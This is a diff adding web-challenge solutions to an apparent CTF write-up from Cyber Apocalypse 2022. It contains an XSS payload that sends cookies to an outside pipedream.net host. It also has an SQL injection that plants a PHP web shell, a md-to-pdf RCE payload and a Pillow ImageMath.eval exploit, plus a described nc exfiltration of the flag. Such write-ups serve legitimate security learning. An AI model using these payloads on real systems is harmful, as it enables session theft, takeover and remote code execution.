@@ -775,4 +775,181 @@ Starting the instance and connecting with nc i got the flag
 
 # Web
 
-## Coming soon
+## Kryptos Support
+The web interface shows that an admin will review our ticket:
+<p align="center">
+    <img src="/assets/images/ctf_cyberapocalypse2022/web/krypto_1.png" alt="drawing" width="900"/>
+</p>
+
+We upload a XSS payload so we can capture the session cookie in a bin request created in pipedream.net
+
+```javascript
+<script>new Image().src="https://eohfbhjjastzji5.m.pipedream.net?c="+document.cookie;</script>
+```
+<p align="center">
+    <img src="/assets/images/ctf_cyberapocalypse2022/web/krypto_2.png" alt="drawing" width="600"/>
+</p>
+
+And we receive the user session cookie
+
+<p align="center">
+    <img src="/assets/images/ctf_cyberapocalypse2022/web/krypto_3.png" alt="drawing" width="600"/>
+</p>
+
+Setting the cookie on the browser and we gain access the tickets endpoint "/tickets", where it was possible to change the moderator password. Capturing this request, it is possible to see that it sends the new password and a UID of the user.
+
+<p align="center">
+    <img src="/assets/images/ctf_cyberapocalypse2022/web/krypto_4.png" alt="drawing" width="600"/>
+</p>
+
+Changing this UID to 1, we change the Admin password instead!
+<p align="center">
+    <img src="/assets/images/ctf_cyberapocalypse2022/web/krypto_5.png" alt="drawing" width="600"/>
+</p>
+
+Logging in as Admin user got us the flag!
+<p align="center">
+    <img src="/assets/images/ctf_cyberapocalypse2022/web/krypto_6.png" alt="drawing" width="600"/>
+</p>
+
+
+## Intergalactic post
+
+Analyzing the code for the email subscription we can see that everytime we submit an email to the application, the server registers it into a SQLite3 database:
+<p align="center">
+    <img src="/assets/images/ctf_cyberapocalypse2022/web/inter_post_1.png" alt="drawing" width="600"/>
+</p>
+
+<p align="center">
+    <img src="/assets/images/ctf_cyberapocalypse2022/web/inter_post_2.png" alt="drawing" width="600"/>
+</p>
+
+
+<p align="center">
+    <img src="/assets/images/ctf_cyberapocalypse2022/web/inter_post_3.png" alt="drawing" width="600"/>
+</p>
+
+As we can see when receiving a new email, the web server fetches the X-Forward-For and adds it to the SQL insert query. We can intercept this parameter and inject an SQL query that will give us Remote Code Execution:
+
+<p align="center">
+    <img src="/assets/images/ctf_cyberapocalypse2022/web/inter_post_4.png" alt="drawing" width="600"/>
+</p>
+
+```
+**', '');** -> it is used to escape the insert query. 
+```
+Since the Sqlite3 allows for the concattenation of commands using ";" we can then create a database and dump a web shell to the web server by issuing the following commands:
+
+```
+ATTACH DATABASE '/www/test1.php' AS exploit;CREATE TABLE exploit.pwn (dataz text);INSERT INTO exploit.pwn (dataz) VALUES ("<?php system($_GET['cmd']); ?>");--
+```
+
+The final query is:
+```
+X-Forwarded-For: ', '');ATTACH DATABASE '/www/test1.php' AS exploit;CREATE TABLE exploit.pwn (dataz text);INSERT INTO exploit.pwn (dataz) VALUES ("<?php system($_GET['cmd']); ?>");--
+```
+<p align="center">
+    <img src="/assets/images/ctf_cyberapocalypse2022/web/inter_post_5.png" alt="drawing" width="600"/>
+</p>
+
+
+After that, we can get the flag name by listing the www directory:
+<p align="center">
+    <img src="/assets/images/ctf_cyberapocalypse2022/web/inter_post_6.png" alt="drawing" width="600"/>
+</p>
+
+And finally get the flag 
+
+<p align="center">
+    <img src="/assets/images/ctf_cyberapocalypse2022/web/inter_post_7.png" alt="drawing" width="600"/>
+</p>
+
+
+
+## Blinker fluid
+
+After analyzing the application, from the package.json it was clear that it was vulnerable to CVE-2021–23639, a vulnerability resides in the md-to-pdf that allows remote code execution.
+
+Using the payload
+```javascritp
+---js
+((require("child_process")).execSync("cat /flag.txt > /app/static/invoices/flag.txt"))
+---RCE
+```
+<p align="center">
+    <img src="/assets/images/ctf_cyberapocalypse2022/web/blinker_1.png" alt="drawing" width="600"/>
+</p>
+
+
+accessing static/invoices/flag.txt  and we got the flag
+<p align="center">
+    <img src="/assets/images/ctf_cyberapocalypse2022/web/blinker_2.png" alt="drawing" width="600"/>
+</p>
+
+
+## Amidst us
+
+Looking at the application we can upload an image and interact with colors:
+
+<p align="center">
+    <img src="/assets/images/ctf_cyberapocalypse2022/web/amidst_1.png" alt="drawing" width="600"/>
+</p>
+
+From the request.txt file we see that it is using Pillow 8.4.0, which is vulnerable to: [CVE-2022-22817](https://github.com/advisories/GHSA-8vj2-vxx3-667w) that allowes an attacker to execute arbitrary code on the ImageMath.eval() function.
+Looking at the code, we see that we can inject commands onto this function by interacting with color array (prints are only for debug purposes):
+<p align="center">
+    <img src="/assets/images/ctf_cyberapocalypse2022/web/amidst_2.png" alt="drawing" width="600"/>
+</p>
+
+By sending a single exec() onto the application we get the following message
+<p align="center">
+    <img src="/assets/images/ctf_cyberapocalypse2022/web/amidst_3.png" alt="drawing" width="600"/>
+</p>
+
+
+<p align="center">
+    <img src="/assets/images/ctf_cyberapocalypse2022/web/amidst_4.png" alt="drawing" width="600"/>
+</p>
+
+Which indicates that the application is trying to execute the function exec().
+By sending a more complex payload like - **exec(import os;os.system('id'))** we realize that it is not possible to send quoted strings to the function.
+
+<p align="center">
+    <img src="/assets/images/ctf_cyberapocalypse2022/web/amidst_5.png" alt="drawing" width="600"/>
+</p>
+
+
+To bypass this, we created a simple exploit that given a specific string payload converts it into chr function
+<p align="center">
+    <img src="/assets/images/ctf_cyberapocalypse2022/web/amidst_6.png" alt="drawing" width="600"/>
+</p>
+
+Sending the payload and we obtain code execution:
+<p align="center">
+    <img src="/assets/images/ctf_cyberapocalypse2022/web/amidst_7.png" alt="drawing" width="600"/>
+</p>
+<p align="center">
+    <img src="/assets/images/ctf_cyberapocalypse2022/web/amidst_8.png" alt="drawing" width="600"/>
+</p>
+
+
+The application crashes but the code was executed.
+To get the flag we checked that nc was on the machine and so we used it to send the flag file to a machine that we had exposed to the internet.
+<p align="center">
+    <img src="/assets/images/ctf_cyberapocalypse2022/web/amidst_9.png" alt="drawing" width="600"/>
+</p>
+Generate the payload and send it over Burp and get the flag:
+<p align="center">
+    <img src="/assets/images/ctf_cyberapocalypse2022/web/amidst_10.png" alt="drawing" width="600"/>
+</p>
+
+
+
+
+
+
+
+
+
+
+
